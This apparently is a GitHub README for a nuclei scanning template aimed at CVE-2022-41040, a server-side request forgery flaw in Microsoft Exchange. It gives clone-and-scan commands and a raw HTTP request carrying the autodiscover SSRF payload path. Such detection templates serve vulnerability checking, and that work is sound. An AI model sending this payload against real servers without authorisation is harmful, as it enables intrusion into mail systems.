# CVE-2022-41040
CVE-2022-41040 nuclei template

* Unverified!


# Usage 

```
git clone https://github.com/numanturle/CVE-2022-41040
cd CVE-2022-41040
nuclei -u https://target -t owa.yaml
```

```
GET /autodiscover/autodiscover.json?@mail.xxx/BACKENDAPI?&Email=autodiscover/autodiscover.json%3f@mail.xxx HTTP/1.1
Host: mail.xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: */*
Connection: close


```

![img](https://github.com/numanturle/CVE-2022-41040/blob/main/img/ss1.png?raw=true)
![img](https://github.com/numanturle/CVE-2022-41040/blob/main/img/ss2.png?raw=true)
![img](https://github.com/numanturle/CVE-2022-41040/blob/main/img/ss3.png?raw=true)




# Reference 

https://www.gteltsc.vn/blog/canh-bao-chien-dich-tan-cong-su-dung-lo-hong-zero-day-tren-microsoft-exchange-server-12714.html

